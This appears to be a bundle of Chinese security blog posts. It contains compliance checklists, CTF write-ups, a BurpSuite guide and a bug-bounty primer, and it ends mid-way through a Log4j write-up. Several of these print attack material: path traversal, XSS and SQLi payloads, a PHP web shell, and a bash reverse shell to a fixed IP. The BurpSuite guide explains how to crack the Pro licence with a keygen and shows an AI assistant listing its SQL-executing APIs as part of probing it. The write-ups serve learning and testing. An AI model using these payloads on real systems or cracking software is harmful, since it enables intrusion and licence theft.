- 预期结果：除管理员账户之外的其他账户不得拥有系统数据库的任何权限，不得拥有 File，Grant，Reload，Shutdown，Process 等权限的任意一种。
- 评估操作示例：mysql>show grants for root@localhost；查看 root 用户的权限。Show grants for+用户名@地址，可以查看指定账户的权限。
- 检查情况：
- 结果：
- 整改建议：修改除管理员外其他用户的权限，其他用户不能有 File，Grant，Reload，Shutdown，Process 等权限，不能出现其他高权限用户。

## 二、访问控制
### （一）MySQL 运行在单独的组上
- 预期结果：不能在 root 账户运行 MySQL 服务器，使用普通非特权用户运行。
- 评估操作示例：mysql>id mysql。
- 检查情况：
- 结果：
- 整改建议：MySQL 不能运行在 root 用户上，需新建一个专用账户给 MySQL 数据库。

### （二）文件权限控制
- 预期结果：MySQL 的数据目录、日志目录，以及目录下的文件属主和属组只能是 mysql 账号，不能给予其他账号任何权限。
- 评估操作示例：ls –la /usr/local/mysql；查看数据目录所属的账号。ls –la /usr/local/mysql/var；查看日志目录所属的账号。
- 检查情况：
- 结果：
- 整改建议：

### （三）命令历史记录保护
- 预期结果：mysql.history 文件中为空，没有命令历史记录。
- 评估操作示例：若没有修改存储历史命令的文件名，则是 mysql.history，我们执行 find / -name mysql.history 站到文件夹所在的位置；cat 打开查看该文件内容。若修改了存储的文件名，则需要询问管理员确认存储位置。
- 检查情况：
- 结果：
- 整改建议：将.bash_history，.mysql_history 文件置空。ln -s /dev/null.bash_history；ln -s /dev/null.mysql_history；将历史命令缓存直接引向垃圾箱。

## 三、安全审计
### （一）启用日志记录
- 预期结果：启用了日志记录，记录日志信息。log-error, log, log-slow-queries 这三种日志的状态是 ON 状态。
- 评估操作示例：MySQL>show variables like 'log_%';
- 检查情况：
- 结果：
- 整改建议：进入 my.cnf 中，在[mysqld]下面加 log-error=/usr/local/mysql/log/error.log。log=/usr/local/mysql/log/mysql.log。long_query_time=2。log-slow-queries= /usr/local/mysql/log/slowquery.log。log-queries-not-using-indexes。

### （二）审计记录应包括事件的日期、时间、类型、主体标识、客体标识和结果等
- 预期结果：审计记录包括事件的日期、时间、类型、主体标识、客体标识和结果等内容。
- 评估操作示例：cat /etc/audit/auditd.conf。cat /etc/audit/audit.rules。
- 检查情况：
- 结果：
- 整改建议：首先需要开启 logbin 日志（记录数据库修改语句和生效时间），再与 init-connect 相结合，两者结合记录完整的信息。

### （三）操作系统应遵循最小安装的原则，仅安装需要的组件和应用程序，并通过设置升级服务器等方式保持系统补丁及时得到更新
- 预期结果：1)系统安装的组件和应用程序遵循了最小安装的原则；2)不必要的服务没有启动。
- 评估操作示例：service --status-all | grep running。
- 检查情况：
- 结果：
- 整改建议：对不必要的服务进行关闭，仅保留系统所需要的最小服务。

## 四、其他内容
### （一）限制单个用户允许的连接数量
- 预期结果：对单个用户的连接数的最大值做出限制，my.cnf 中的 max_user_connections 系统变量为非零值。
- 评估操作示例：MySQL>show global variables like '%connect%'。
- 检查情况：
- 结果：
- 整改建议：根据系统的实际承受能力，限制单个用户连接数，在/etc/my.cnf 中进行限制。

### （二）服务监听端口
- 预期结果：修改 mysql 默认监听端口 3306 为其他端口。
- 评估操作示例：show global variables like 'port';看一下监听端口是不是 3306。
- 检查情况：
- 结果：
- 整改建议：vim my.cnf 文件，修改其中的 port 参数为非 3306 且未被占用的端口。

### （三）登录终端超时锁定
- 预期结果：设置了超时时间，在时间内没有操作，再次操作时就会提示超时。
- 评估操作示例：MYSQL>show VARIABLES like '%timeout%';或访谈了解防火墙等其他安全设备是否做了相关策略。
- 检查情况：
- 结果：
- 整改建议：设置 interactive_timeout 为 300 秒。Mysql> set global interactive_timeout=300;

# 防火墙策略调研表


**防火墙策略调研表**

|表名|设备名称|所属位置|设备用途|部署模式（是否有设备心跳信息）|本设备IP|管理端IP|备注|
|---|---|---|---|---|---|---|---|
|表1.防火墙策略调研表|||||||||
|表2.允许放通的业务信息调研表|开放的业务|源IP|业务端口|对那些IP开放||||
|表3.与其他业务系统互通的调研表|需要访问的业务|源IP|目的IP|目的端口||||

**防火墙策略配置表**

|编号|源IP|目的IP|源端口|目的端口|协议类型|网卡接口|包流向|动作|
|---|---|---|---|---|---|---|---|---|
|1|*|*|*|80|TCP|*|出|允许|




# Windows标准检查表a

一、身份鉴别
1. **应对登录操作系统和数据库系统的用户进行身份标识和鉴别**
    - 预期结果：操作系统使用口令鉴别机制对用户进行身份标识和鉴别，且不存在密码为空的用户。
    - 评估操作示例：访谈管理员，并查看登录过程中系统账户是否使用了密码进行登录验证。
    - 检查情况：
    - 结果：操作系统和数据库每个用户都必须设置登录用户名和登录密码，不能存在空密码。
    - 整改建议：
2. **操作系统和数据库系统管理用户身份标识应具有不易被冒用的特点，口令应有复杂度要求并定期更换**
    - 预期结果：密码启用复杂度要求；密码最小长度为8位；密码最短使用期限为1天；密码最长使用期限90天；强制密码历史为0个；用可还原的加密来储存密码已禁用。
    - 评估操作示例：cmd>secpol.msc>账户策略>密码策略。
    - 检查情况：
    - 结果：密码启用复杂度要求；密码最小长度为8位；密码最短使用期限为1天；密码最长使用期限90天；强制密码历史为0个；用可还原的加密来储存密码已禁用。
    - 整改建议：
3. **应启用登录失败处理功能，可采取结束会话、限制非法登录次数和自动退出等措施**
    - 预期结果：账户锁定时间10分钟；账户锁定阈值5次；重置账户锁定计数器10分钟后。
    - 评估操作示例：cmd>secpol.msc>账户策略>账户锁定策略。
    - 检查情况：
    - 结果：账户锁定时间10分钟；账户锁定阈值5次；重置账户锁定计数器10分钟后。
    - 整改建议：
4. **当对服务器进行远程管理时，应采取必要措施，防止鉴别信息在网络传输过程中被窃听**
    - 预期结果：客户端和服务器之间发送数据受加密保护，加密级别根据实际情况来判断，尽量符合FIPS标准。
    - 评估操作示例：cmd>control>管理工具>终端服务配置>连接>RDP - Tcp>右键属性>加密级别。
    - 检查情况：
    - 结果：cmd>control>管理工具>终端服务配置>连接>RDP - Tcp>右键属性>加密级别，选择尽量高级别的加密。
    - 整改建议：
5. **为操作系统和数据库的不同用户分配不同的用户名，确保用户名具有唯一性**
    - 预期结果：不存在重复的用户名。
    - 评估操作示例：cmd>lusrmgr.msc查看“用户”中是否存在重复的用户名。
    - 检查情况：
    - 结果：对重复的用户名进行修改。
    - 整改建议：
6. **应采用两种或两种以上组合的鉴别技术对管理用户进行身份鉴别**
    - 预期结果：对管理员访谈，对于三级系统，必须使用两种或两种以上组合的鉴别技术实现用户身份鉴别，如密码和口令的组合使用。
    - 评估操作示例：访谈管理员。
    - 检查情况：
    - 结果：三级系统建议采用用户名密码 + 证书口令登录的方式；三级以下系统可以采用一种鉴别技术。
    - 整改建议：

二、访问控制
1. **是否开启默认共享**
    - 预期结果：没有共享文件夹。
    - 评估操作示例：cmd>fsmgmt.msc，查看共享目录下面的文件夹的内容。
    - 检查情况：
    - 结果：关闭默认共享，cmd>fsmgmt.msc，点击共享，右键选择停止共享。
    - 整改建议：
2. **是否禁止ipc$空连接进行枚举**
    - 预期结果：restrictanonymous = 1。
    - 评估操作示例：cmd>regedit>HKEY_LOCAL_MACHINE>SYSTEM>CurrentControlSet>Control>LSA，找到LSA中的restrictanonymous值是否等于1。
    - 检查情况：
    - 结果：按照上述步骤，在注册表中修改restrictanonymous的值。
    - 整改建议：
3. **应实现操作系统和数据库系统特权用户的权限分离**
    - 预期结果：操作系统和数据库的特权用户的权限必须分离，避免一些特权用户拥有过大的权限，减少人为误操作。
    - 评估操作示例：访谈管理员。
    - 检查情况：
    - 结果：分离数据库和操作系统的特权用户，不能使一个用户权限过大。
    - 整改建议：
4. **应严格限制默认帐户的访问权限，重命名系统默认帐户，修改这些帐户的默认口令**
    - 预期结果：管理员账户已更改名称，禁用了guest（来宾）账号。
    - 评估操作示例：cmd>lusrmgr.msc>用户，管理员账号是否改名（默认为administrator），guest账户是否被禁用。
    - 检查情况：
    - 结果：cmd>lusrmgr.msc>用户，可以修改管理员账号名称和禁用guest账户。
    - 整改建议：
5. **应及时删除多余的、过期的帐户**
    - 预期结果：不存在多余、过期账户。
    - 评估操作示例：cmd>lusrmgr.msc>用户。
    - 检查情况：
    - 结果：cmd>lusrmgr.msc>用户，删除一些与设备运行、维护等工作无关的账号。
    - 整改建议：

三、安全审计
1. **审计内容应包括重要用户行为、系统资源的异常使用和重要系统命令的使用等系统内重要的安全相关事件**
    - 预期结果：审计功能已开启，包括：审核策略更改、审核登录事件、审核对象访问、审核过程跟踪、审核目录服务访问、审核特权使用、审核系统事件、审核帐户登录事件、审核帐户管理等设置。
    - 评估操作示例：cmd>secpol.msc>本地策略>审核策略。
    - 检查情况：
    - 结果：cmd>secpol.msc>本地策略>审核策略，设置为成功或失败。
    - 整改建议：
2. **日志记录应包括事件的日期、时间、类型、主体标识、客体标识和结果等**
    - 预期结果：日志记录包括事件的日期、时间、类型、主体标识、客体标识和结果等内容。
    - 评估操作示例：cmd>eventvwr>系统，查看其中的系统日志详细信息。
    - 检查情况：
    - 结果：
    - 整改建议：
3. **日志记录缓存的大小和达到上限后的覆盖规则**
    - 预期结果：日志存储上限为20480kb，达到存储上限后按需要覆盖事件。
    - 评估操作示例：cmd>eventvwr>系统>右键属性。
    - 检查情况：
    - 结果：cmd>eventvwr>Windows日志>系统>右键属性，可自己调整日志记录规则和日志缓存大小。
    - 整改建议：

四、入侵防范
1. **设置升级服务器等方式保持系统补丁及时得到更新**
    - 预期结果：已经更新到最近的补丁版本。
    - 评估操作示例：cmd>control>添加删除程序>记录系统补丁号。
    - 检查情况：
    - 结果：及时更新最新的系统补丁。
    - 整改建议：
2. **系统是否已经开启服务中一些不必要的服务**
    - 预期结果：未开启一些不必要的服务（如Alerter，Remote Registry Service，Messenger，Task Scheduler等）。
    - 评估操作示例：cmd>services.msc，查看正在运行的服务。
    - 检查情况：
    - 结果：cmd>services.msc，对一些不必要的服务进行关闭。
    - 整改建议：

五、资源控制
1. **应根据安全策略设置登录终端的操作超时锁定**
    - 预期结果：应设置空闲的终端服务会话设置时间限制300秒。
    - 评估操作示例：cmd>gpedit.msc>计算机配置>管理模板>Windows组件>终端服务>。
    - 检查情况：
    - 结果：超时时间建议设置为300秒。
    - 整改建议：
2. **应根据安全策略限制终端连接的数量**
    - 预期结果：根据系统实际情况，建议限制终端连接数量为5个。
    - 评估操作示例：cmd>gpedit.msc>计算机配置>管理模板>Windows组件>终端服务>。
    - 检查情况：
    - 结果：限制终端连接数量为5个，避免造成系统资源占用过多。
    - 整改建议：

六、剩余信息保护
1. **应保证操作系统和数据库管理系统用户的鉴别信息所在的存储空间，被释放或再分配给其他用户前得到完全清除，无论这些信息是存放在硬盘上还是在内存中**
    - 预期结果：在登录系统时不显示上次的用户登录名。
    - 评估操作示例：cmd>secpol.msc>本地策略>安全选项>交互式登录不显示上次的用户名是否禁用。
    - 检查情况：
    - 结果：cmd>secpol.msc>本地策略>安全选项>交互式登录不显示上次的用户名，右键属性选择启用。
    - 整改建议：
2. **应确保系统内的文件、目录和数据库记录等资源所在的存储空间，被释放或重新分配给其他用户前得到完全清除**
    - 预期结果：系统启用关机前清除虚拟内存页面。
    - 评估操作示例：cmd>secpol.msc>本地策略>安全选项>关机：清除虚拟内存页面文件。
    - 检查情况：
    - 结果：cmd>secpol.msc>本地策略>安全选项>关机：清除虚拟内存页面文件，右键属性选择开启。
    - 整改建议：`,_e=`---
title: filter设计缺陷导致的权限绕过
tags: [XCTF,权限绕过]
categories: [CTF]
---


\`\`\`bash
GET /login.html/../flag.html HTTP/1.1 # 返回到根目录下 访问flag.html 
Host: 61.147.171.105:63076
Cache-Control: no-cache
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Pragma: no-cache
Upgrade-Insecure-Requests: 1
Cookie: JSESSIONID=C4A50FA26043136F4272E8E4B946C2C9; Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1724942854; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1724942854; HMACCOUNT=D013441DFA61A5ED
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept-Encoding: gzip, deflate
\`\`\`

![alt text](../assets/img/image-75.png)

# 总结

1. 必须要知道访问的html文件的路径
2. login是白名单
3. 通过\`../\`可以返回到根目录下`,Se=`---
title: BurpSuite指南
tags:
  - 网络安全
  - 安全工具
categories:
  - WeSec
image:
  path: ../assets/img/image-80.png
  lqip: ../assets/img/image-80.png
---

## 安装

1. 推荐下载最新版本的 BurpSuite，[官方下载地址](https://portswigger.net/burp/releases#professional)

2. 最新的里面自己携带了 JDK, 避免 JDK 版本不匹配的问题

3. 注册机 ![alt text](../assets/img/image-81.png),可以去[Site](https://leonooo13.github.io//site/)**ByteSec**获取

4. 修改 BurpSuitePro.vmoptions 文件内容![alt text](../assets/img/image-82.png) 注意注册机器名称一致

5. 启动![alt text](../assets/img/image-83.png)

6. 为了可以直接使用 Burpsuite 可以修改同名文件下的的
   \`BurpSuitePro.vmoptions\`

   \`\`\`shell
   # Enter one VM parameter per line
   # For example, to adjust the maximum memory usage to 512 MB, uncomment the following line:
   # -Xmx512m
   # To include another file, uncomment the following line:
   # -include-options [path to other .vmoption file]

   -XX:MaxRAMPercentage=50
   -include-options settings.vmoptions
   -include-options user.vmoptions
   --add-opens=java.desktop/javax.swing=ALL-UNNAMED
   --add-opens=java.base/java.lang=ALL-UNNAMED
   --add-opens=java.base/jdk.internal.org.objectweb.asm=ALL-UNNAMED
   --add-opens=java.base/jdk.internal.org.objectweb.asm.tree=ALL-UNNAMED
   --add-opens=java.base/jdk.internal.org.objectweb.asm.Opcodes=ALL-UNNAMED
   -javaagent:BurpLoaderKeygen.jar
   -noverify
   -Xmx2048m
   \`\`\`

## 界面

![alt text](../assets/img/image-78.png)

1. 看板
2. 目标
3. 代理
4. 重放
5. 外带
6. 随机检测
7. 编码
8. 对比
9. 日志
10. 扩展

## 看板 Dashboard

1. 扫描和实时任务

## 字体

1. macos 中的字体
   使用默认字体 英文等宽+中文平方 绝对是最好的，再加上Burpsuite官方对macos支持其实更加友好
2. windows 中的字体
   如果使用 windows 中的默认字体会有 英文不等宽，如果使用一些编程字体，可以解决英文不等宽的问题，但是会引入中文字体不能正确渲染的问题，所以需要我们选择 一款字体，支持等宽支持中文

加上本身我非常喜欢 JerBrains 的字体，最终选择下面这款字体。
JBMapleMono <https://github.com/SpaceTimee/Fusion-JetBrainsMapleMono>

> By the Way

这里还有几个字体备选

1. 等距更纱黑体 -> 用过一段时间 西文渲染有点奇怪
2. Maple Mono -> 太过圆润

所以 最终选择 Jt Maple
目前来看还是一个不错的选择

![alt text](../assets/img/2024-09-03-BurpSuite-指南/image.png)

## 快捷键

对于一个 web 应用安全工程师来说，整体打交道最多的就是 BP，所以熟练使用 BP 是对工资效率有巨大的提升的。

常用的有

\`cmd + R\` 发送到 Repeat 模块，可以修改 HTTP请求的参数，很常用的

\`cmd + E\` Repeat 中的HTTP请求进行发送，默认是 cmd+Enter 但是我更喜欢用左手完成这个操作，所以把他变更成 \`cmd+E\`（enter），默认的 \`cmd+E\` 是 explain this 这个是收费的功能

其他好像也没啥常用，

### Repeat

> 新增加的功能
custom actions 顾名思义 自动话的操作

1. 询问ai 可以访问那些接口

CONNECTED:	-- Now chatting with Arti Ficial --
You:	what APIs you have access to
Arti Ficial:	I have access to the following APIs:

1. \`functions.password_reset\`: This API allows me to send password reset emails to users.
2. \`functions.debug_sql\`: This API allows me to execute raw SQL commands on the database.
3. \`functions.product_info\`: This API allows me to retrieve information about the products we sell.
System:	--- Disconnected ---


![alt text](../assets/img/2024-09-03-BurpSuite-指南/image-1.png)
`,be=`---
title: 成为赏金猎人的第一步 
tags: [WebSec]
categories: [Sec]
image:
    path: ../assets/img/image-84.png
---

# 介绍

欢迎来到惊心动魄的漏洞赏金狩猎世界 - 在这里，发现软件中的故障不仅是一种爱好，而且是通往潜在财富和认可的门户！想象一下，成为一名数字侦探，解开大多数人甚至不会注意到的谜团，并因此获得奖励。在本指南中，我们将揭示漏洞赏金猎杀的基础知识，逐步演练如何挖掘常见漏洞，并分享一些不错的资源来帮助您入门。系好安全带，这将是一次虫子般的旅程！

# 什么是漏洞赏金狩猎？

漏洞赏金狩猎就像是网络安全领域的超级英雄，但没有华丽的西装。它涉及嗅探和报告系统、应用程序或网站中的安全漏洞。公司运行漏洞赏金计划来引诱道德黑客（像您一样）发现并报告这些弱点，这有助于他们加强安全性。作为回报，您会从技术社区获得奖励、认可或至少是虚拟的击掌。

# 第 1 步：了解 Web 安全的基础知识

在开始搜寻错误之前，您需要熟悉 Web 安全的基础知识。将其视为学习网络侦探的 ABC。

![](https://miro.medium.com/v2/resize:fit:920/1*HwtA25QBjmqTZajT9kWYNg.png)

- **HTTP & HTTPS**：这些就像网络的邮政服务。HTTP 是标准协议，而 HTTPS 是它的安全表亲，用于加密浏览器和服务器之间的数据。始终使用 HTTPS — 这就像在 Web 上系安全带一样。
- **OWASP 前 10 大**风险：这是您对 10 大 Web 安全风险的备忘单。熟悉这些麻烦制造者：
- **SQL 注入 （SQLi）：**当黑客把你的数据库当作玩具来玩的时候。
- **跨站点脚本 （XSS）：**当错误的脚本在您的网站上崩溃时。
- **损坏的身份验证**：当您的登录系统像纸锁一样安全时。
- **敏感数据泄露**：当您的私人信息像在广告牌上一样被公开时。
- **XML 外部实体 （XXE）：**当您的 XML 文件成为偷偷摸摸的麻烦制造者时。
- **访问控制失效**：当用户访问的内容超出他们应该访问的内容时，例如闯入 VIP 部分。
- **安全配置错误**：当您的安全设置像拼图一样混淆时。
- **跨站点请求伪造 （CSRF）：**当攻击者让您的站点做它不应该做的事情时。
- **不安全的反序列化**：当正在处理的数据全部混乱时。
- **使用具有已知漏洞的组件**：使用过时的部件时，就像把漏水的水桶带到派对上。
- **网络基础知识**：了解 IP 地址、DNS 和数据如何通过网络传输。这就像了解信件是如何到达您的邮箱的，但需要更多的技术性杂项。

# 第 2 步：熟悉交易工具

每个超级英雄都需要他们的小工具，对于漏洞赏金猎杀，您有一些很酷的工具：

![](https://miro.medium.com/v2/resize:fit:1134/1*esB4fV2xoa2DafsCJYfoPA.png)

- **Burp Suite**：将其视为 HTTP 请求和响应的放大镜。它功能强大，如果您刚刚起步，它包含在社区版本中。查看 Burp Suite Community Edition 和 Burp Suite 初学者教程。
- **Nmap**：扫描网络和发现开放端口的首选工具。它就像你寻找弱点的雷达。探索 [Nmap 官方网站](https://nmap.org/)和 Nmap 初学者教程。
- **OWASP ZAP**：一种开源安全扫描程序，可帮助您发现漏洞。这就像有一个不眠不休的伙伴。查看 OWASP ZAP 官方网站和 OWASP ZAP 用户指南。
- **Google Dorking**：使用高级搜索运算符来挖掘互联网上暴露的信息。这就像使用一个超级强大的搜索引擎来寻找隐藏的宝石。阅读 Google Dorking 指南。

# 第 3 步：选择漏洞赏金平台

现在，您实际上在哪里寻找这些虫子呢？以下是一些可以开始使用的平台：

![](https://miro.medium.com/v2/resize:fit:1086/1*1fDF2jOW4bmr5igxvHdEYQ.png)

- **HackerOne**：拥有来自大公司的项目的大联盟。查看 [HackerOne](https://www.hackerone.com/) 及其初学者指南。
- **Bugcrowd**：另一个有各种程序可供探索的顶级平台。访问 [Bugcrowd](https://www.bugcrowd.com/) 和 Bugcrowd 大学。
- **Synack**：一个具有申请流程的更独特的平台。如果您觉得花哨，请前往 [Synack](https://www.synack.com/)。
- **Open Bug Bounty**：即使您没有正式的计划，也专注于负责任的披露。查看 [Open Bug Bounty](https://www.openbugbounty.org/)。

# 第 4 步：查找漏洞 — 分步示例

让我们戴上侦探的帽子，深入研究一些经典的漏洞：

# **示例 1：跨站点脚本 （XSS）**

XSS 就像一个恶作剧者，将恶意脚本注入网页。以下是捕捉它们的方法：

- **识别输入字段**：查找可以键入内容的地方 - 搜索框、评论部分或个人资料。
- **Inject Test Script**：删除一个简单的脚本，例如：
- \`<script>alert('XSS')<\/script>\`
- 进入 Input 字段并点击 Submit。
- **检查执行**：如果您看到弹出一个警报框，则您发现了 XSS 漏洞。恭喜！
- **报告漏洞**：在报告中描述您的发现 — 说明您是如何做到的、影响，并提供修复漏洞的建议。这就像写一份侦探报告。

**示例：测试搜索字段**

- 在搜索框中输入\`<script>alert('Test')<\/script>\`
- 如果出现警报框，则表示存在 XSS 漏洞。

# **示例 2：远程代码执行 （RCE）**

RCE 是指黑客可以从远处在服务器上运行命令。以下是找到它的方法：

- **查找用户输入：**查找用户可以上传文件或输入命令的位置。
- **测试文件上传**：上传带有可执行代码扩展名的文件，如 或 .请尝试以下有效负载：\`.php\`\`.asp\`
- \`<?php system($_GET['cmd']); ?>\`
- **执行命令**：通过 Web 访问上传的文件，并使用 URL 参数传递命令。例如：\`[http://example.com/uploads/yourfile.php?cmd=ls](http://example.com/uploads/yourfile.php?cmd=ls)\`
- **观察输出**：如果命令运行并且您看到输出，则服务器容易受到 RCE 的攻击。
- **报告漏洞**：详细说明您上传文件、执行命令的方式以及潜在影响。

**示例：上传 PHP 文件**

- 上传名为 的内容 的文件。\`shell.php\`\`<?php phpinfo(); ?>\`
- 通过以下方式访问它以查看它是否执行。\`http://example.com/uploads/shell.php\`

# **示例 3：服务器端请求伪造 （SSRF）**

SSRF 是指攻击者诱骗服务器向内部资源发出请求。以下是嗅探它的方法：

- **识别 URL 参数**：查找接受 URL 或 IP 地址的参数。
- **注入恶意 URL**：使用指向内部资源的 URL 进行测试，例如：
- \`http://localhost/admin [http://127.0.0.1](http://127.0.0.1/)\`
- **Observe Response**：检查服务器是否从内部 URL 返回数据。
- **报告漏洞**：说明您如何注入 URL、您观察到的响应以及潜在影响。

**示例：操作 URL 参数**

- 将参数更改为其他内部地址。\`http://example.com/fetch?url=http://localhost\`

# 示例 4：SQL 注入 （SQLi）

**SQL 注入 （SQLi）** 涉及将恶意 SQL 查询注入应用程序以操纵数据库。以下是测试 SQLi 的方法：

1. **识别输入字段**：查找可在其中输入与数据库交互的数据的字段，例如登录表单或搜索栏。
2. **Inject SQL Payload**：使用 SQL 注入有效负载测试输入字段。例如：

- \`' OR '1'='1\`

1. **观察响应**：如果应用程序返回意外结果或数据库错误，则可能容易受到 SQLi 的攻击。
2. **Report the Vulnerability（报告漏洞**）：提供注入、响应和潜在影响的详细信息。

**示例**：测试登录表单：

- 输入 username 和 password。如果它让您登录，则该站点容易受到攻击。\`admin' OR '1'='1\`

# 第 5 步：向社区学习

加入漏洞赏金社区可以提高您的技能和知识：

1. **文章**： 阅读经验丰富的猎人的文章可以深入了解不同的技术和方法。像 Hack The Box Write-Ups 这样的网站提供有价值的信息。
2. **论坛和 Discord 频道**：加入漏洞赏金猎人的论坛和 Discord 频道。这些平台非常适合提出问题和分享知识。

- Bugcrowd 论坛
- HackerOne 社区

1. **博客和视频**：关注网络安全博客和 YouTube 频道以获取更新和教程。

- [安全周刊](https://securityweekly.com/)
- [Bug Bounty 中心](https://www.bugbountyhub.io/)
- [LiveOverflow 的 YouTube 频道](https://www.youtube.com/c/LiveOverflow)

# 有关漏洞赏金狩猎的其他提示

1. **_了解范围_**_：每个漏洞赏金计划都有一个定义的范围，用于指定哪些应用程序、域或功能在测试范围内。始终阅读并遵守程序的规则，以避免测试未经授权的区域。_

- _HackerOne 范围策略_

**_2. 保持更新_**_：网络安全形势一直在发展。通过关注行业新闻和更新，了解最新的漏洞、工具和技术。_

- [_CVE 详细信息_](https://www.cvedetails.com/)
- [_漏洞利用数据库_](https://www.exploit-db.com/)

**_3. 合乎道德地实践_**_：始终负责任地使用您的技能。尊重每个漏洞赏金计划的规则，避免对系统或用户造成伤害。_

**_4. 记录所有内容_**_：详细记录您的发现，包括重现漏洞的步骤、影响和任何缓解建议。这将帮助您编写更好的报告并与项目经理进行有效沟通。_

**_5. 明智地使用自动化_**_：虽然自动化工具可以帮助识别漏洞，但手动测试对于发现复杂问题至关重要。将自动化用作手动分析的补充，而不是替代品。_

# 示例场景：漏洞赏金搜寻的实际应用

# 场景 1：在搜索页面上查找 XSS

**分步示例**：

1. **导航到 Search Page**：打开目标应用程序的搜索页面。
2. **测试输入字段**：在搜索框中，输入 。\`<script>alert('XSS')<\/script>\`
3. **提交并观察**：单击搜索按钮并观察是否弹出警报框。
4. **验证并报告**：如果脚本执行，则表示存在 XSS 漏洞。编写一份报告，详细说明受影响的 URL、使用的有效负载和影响。

# 场景二：通过文件上传利用 RCE

**分步示例**：

1. **查找文件上传功能**：查找允许文件上传的应用程序部分，例如头像或文档上传功能。
2. **准备恶意文件**：创建包含以下内容的 PHP 文件：

- \`<?php system($_GET['cmd']); ?>\`

1. **Upload the File（上传文件**）：将 PHP 文件上传到服务器。
2. **访问文件**：通过 URL（例如 ）访问文件以执行命令。\`http://example.com/uploads/malicious.php?cmd=ls\`
3. **验证执行：**如果您看到命令的输出，则服务器容易受到 RCE 的攻击。报告问题，并提供有关文件上传过程和执行的命令的详细信息。

# 场景 3：通过 URL 参数利用 SSRF

**分步示例**：

1. **查找 URL 参数**：在应用程序中查找接受用户输入的 URL 参数，例如 URL 获取功能。
2. **Inject Internal URLs**：在参数中输入 like 或 的 URL。\`http://localhost/admin\`\`http://127.0.0.1\`
3. **检查响应**：观察应用程序是否从内部 URL 或服务返回信息。
4. **报告漏洞**：记录 URL 参数、注入的负载和响应。

# 场景 4：登录表单中的 SQL 注入

**分步示例**：

1. **找到登录表单**：在目标网站上找到登录表单。
2. **Inject SQL Payload（注入 SQL 负载**）：输入用户名和密码。\`admin' OR '1'='1\`
3. **提交表单**：单击登录，查看您是否获得了未经授权的访问权限。
4. **Document and Report**：如果成功，则报告 SQL 注入以及有关有效负载及其效果的详细信息。

# 链接和资源

## 学习平台和教程

- **_Hacker101_**_：_ [_Hacker101 — 免费在线安全培训_](https://www.hacker101.com/)
- **_PortSwigger Web Security Academy_**_：免费学习 Web 安全_
- **_Bugcrowd 大学_**_：免费漏洞赏金培训_
- **_OWASP （Open Web Application Security Project）：_**[_OWASP 资源_](https://owasp.org/)

## 练习平台

- **_Hack The Box_**_：_[_Hack The Box — 练习网络安全_](https://www.hackthebox.com/)
- **_TryHackMe_**_：_ [_TryHackMe — 学习网络安全_](https://tryhackme.com/)
- **_VulnHub_**_：_[_VulnHub — 设计易受攻击_](https://www.vulnhub.com/)
- **_CTFtime_**_：_[_Capture The Flag 事件_](https://ctftime.org/)

## 漏洞赏金计划和平台

- **_HackerOne_**_：_ [_HackerOne — 漏洞赏金平台_](https://www.hackerone.com/)
- **_Bugcrowd_**_：_ [_Bugcrowd — 查找和报告 Bug_](https://www.bugcrowd.com/)
- **_Synack_**_：_ [_Synack — 托管的 Bug 赏金_](https://www.synack.com/)计划
- **_Cobalt_**_：_[_Cobalt — 渗透测试即服务_](https://cobalt.io/)

## 工具和资源

- **_Burp Suite_**_：Burp Suite — Web 漏洞扫描程序_
- **_OWASP ZAP（Zed 攻击代理）：_**[_OWASP ZAP — 免费安全扫描程序_](https://www.zaproxy.org/)
- **_Nmap_**_：_ [_Nmap — 网络扫描器_](https://nmap.org/)
- **_Nikto_**_： Nikto — Web 服务器扫描仪_

## 学习和社区

- **_黑客新闻_**_：_[_随时了解安全新闻_](https://thehackernews.com/)
- **_Krebs on Security （安全性_**_）：_ [_Krebs on Security 博客_](https://krebsonsecurity.com/)
- **_Reddit — NetSec_**_：_[_NetSec Subreddit_](https://www.reddit.com/r/netsec/)
- **_Twitter — 关注安全专家_**_：_[_在 Twitter 上关注安全专家列表_](https://twitter.com/)

## 文档和报告

- **_Exploit-DB_**_：_ [_漏洞利用数据库 — 漏洞利用_](https://www.exploit-db.com/)
- **_CVE 详细信息_**_：_[_CVE 详细信息 — 漏洞数据库_](https://www.cvedetails.com/)
- **_安全焦点_**_：_[_安全焦点 — 漏洞数据库_](https://www.securityfocus.com/)

# 结论

漏洞赏金猎人就像一个有趣的寻宝游戏，用于查找 Web 上的安全漏洞。如果您遵守规则、做好笔记并明智地使用您的工具，这很令人兴奋，并且会非常有益。想象自己是一个拯救世界的超级英雄，但你得到的不是斗篷，而是键盘。保持您的冒险道德，像藏宝图一样记录您的发现，并将自动化作为您值得信赖的伙伴，而不是您唯一的工具。祝您狩猎愉快，愿您能找到像大海捞针一样难以捉摸的虫子！🚀💻🔍

进一步的学习和实践：

- **漏洞赏金教程**：[Hacker101](https://www.hacker101.com/)
- **CTF 平台**：[Hack The Box](https://www.hackthebox.com/)、[TryHackMe](https://tryhackme.com/)
- **网络安全博客**：[The Hacker News](https://thehackernews.com/)、[Krebs on Security](https://krebsonsecurity.com/)
`,ve=`---
title: CISCN2021总决赛babypython 
tags: [CTF,Web]
categories: [WebSec]
image:
    path: ../assets/img/image-85.png
---


# 题解思路

伪造session，获取flag


1. ![alt text](../assets/img/image-86.png)

\`uuid.getnode()\`函数可以获取网卡mac地址并转换成十进制数返回

2. 获取网卡mac地址
    ![alt text](../assets/img/image-87.png)

3. 伪造session
   flask manage session 为flask的session管理器，可以伪造session
`,fe=`---
title: CVE-2021-44228 # 文章名称
tags: [Sec,CVE]
categories: [WebSec,CVE]
image:
    path: ../assets/img/image-88.png
---


# 题解思路


## 成因

该漏洞的主要原因是log4j在日志输出中，未对字符合法性进行严格的限制，执行了JNDI协议加载的远程恶意脚本，从而造成RCE。这里面有一个关键点就是，什么是JNDI,为什么JNDI可以造成RCE

## 编写恶意代码
### 反弹shell

\`\`\`bash
    bash -i >& /dev/tcp/192.168.31.241/44443 0>&1
\`\`\`

### 进行base64编码

![alt text](../assets/img/image-89.png)
    
\`\`\` bash
